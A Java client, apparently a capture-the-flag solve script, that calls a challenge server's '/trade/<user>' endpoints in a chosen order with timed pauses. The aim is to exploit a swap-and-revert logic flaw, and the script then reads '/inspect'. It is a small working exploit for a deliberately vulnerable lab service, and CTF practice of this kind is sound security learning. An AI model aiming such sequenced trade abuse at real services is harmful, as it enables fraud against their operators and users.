package leetcode;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class TradeClient {
    private static final String BASE_URL = "http://r56gdb9k.chals.mctf.io";

//    private static final String BASE_URL = "http://0.0.0.0:8080";

    // Swap sequence (H → A → B → C → D → E → D)
    private static final String[] USERS = {
//            "ShadowNinja92",   // A (52) SparkleDrake
//            "ZappyZoomer",     // B (60) AquaBlitz
//            "GlimmerGizmo",    // C (83) FlameWhisk
//            "ThunderMuncher",  // D (95) ThunderPuff

            "ShadowNinja92",
            "FuzzyFlash23"

//            "FuzzyFlash23",
//            "FuzzyFlash23"// D again, offload to lock E
    };

    public static void main(String[] args) {
        try {
            for (String user : USERS) {
                doTrade(user);
                // small pause so server registers the swap
                Thread.sleep(1000);
            }

            // wait long enough for last revert cycle
            System.out.println("\n[*] Waiting for final revert cycle...");
            Thread.sleep(10000);

            // final inspect
            String finalInspect = sendGet(BASE_URL + "/inspect");
            System.out.println("\n[+] Final Inspect: " + finalInspect);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void doTrade(String user) {
        try {
            String url = BASE_URL + "/trade/" + user;
            System.out.println("\n[*] Attempting trade with " + user + " (" + url + ")");
            String response = sendGet(url);
            System.out.println("[+] Trade Response: " + response.substring(0, Math.min(response.length(), 200)) + "...");
        } catch (Exception e) {
            System.out.println("[!] Trade with " + user + " failed: " + e.getMessage());
        }
    }

    private static String sendGet(String urlStr) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);

        int status = conn.getResponseCode();
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String inputLine;
        StringBuilder content = new StringBuilder();

        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine);
        }

        in.close();
        conn.disconnect();

        return status + " " + content.toString();
    }
}